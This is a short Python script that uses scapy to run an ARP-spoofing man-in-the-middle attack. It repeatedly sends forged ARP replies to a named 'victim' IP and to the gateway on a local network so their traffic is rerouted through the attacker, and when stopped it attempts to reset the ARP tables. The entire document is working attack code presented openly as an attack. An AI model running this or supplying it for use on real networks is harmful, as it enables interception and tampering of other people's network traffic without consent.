from scapy.all import ARP, send
import time

target_ip = "192.168.50.200" # Victim's IP address 
router_ip = "192.168.50.1"   # Gateway IP address
my_mac = "00:11:22:33:44:55" # Attacker's MAC address


def arp_spoof(target_ip, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip)
    send(packet, verbose=False)

try:
    print("Starting the attack")
    while True:
      
        arp_spoof(target_ip, router_ip)
        
      
        arp_spoof(router_ip, target_ip)
        
        time.sleep(2) 
except KeyboardInterrupt:
    print("Stopping the attack and turn back the arp table")
    send(ARP(op=2, pdst=target_ip, psrc=router_ip, hwdst="ff:ff:ff:ff:ff:ff"), count=5)
    send(ARP(op=2, pdst=router_ip, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff"), count=5)
    print("Done!")